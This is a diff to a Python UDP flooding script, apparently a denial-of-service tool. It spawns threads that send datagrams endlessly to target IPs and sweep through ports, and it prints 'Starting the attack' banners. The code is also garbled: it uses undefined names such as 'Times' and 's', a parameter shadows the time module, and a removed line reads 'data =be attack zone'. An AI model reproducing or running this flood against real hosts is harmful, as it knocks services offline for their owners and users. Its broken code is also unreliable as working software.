@@ -52,11 +52,11 @@ mydate = time.strftime('%Y-%m-%d')
 mytime = time.strftime('%H-%M')
 
 # Lets define sock and bytes for our attack
-def send_packets(ip, port, data, proxy_size):
+def send_packets(ip, port, data, time):
     sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
     sent = 0
     while True:
-        for i in range(proxy_size):
+        for i in range(Times):
             sock.sendto(data, (ip, port))
             sent += 1
             port += 1
@@ -84,7 +84,7 @@ time.sleep(3)
 for ip in ips:
     for port in ports:
         # Use a bytes literal to create the data
-        data =be attack zone
+        s.send(data)
         print("[✴️]  \033[32mRiri  \033[34m" +str(1)+ " \033(33m Starting the attack on \033[94m" +ip+ " \033[0m")
         for i in range(threads):
             t = threading.Thread(target=send_packets, args=(ip, int(port), data, time))
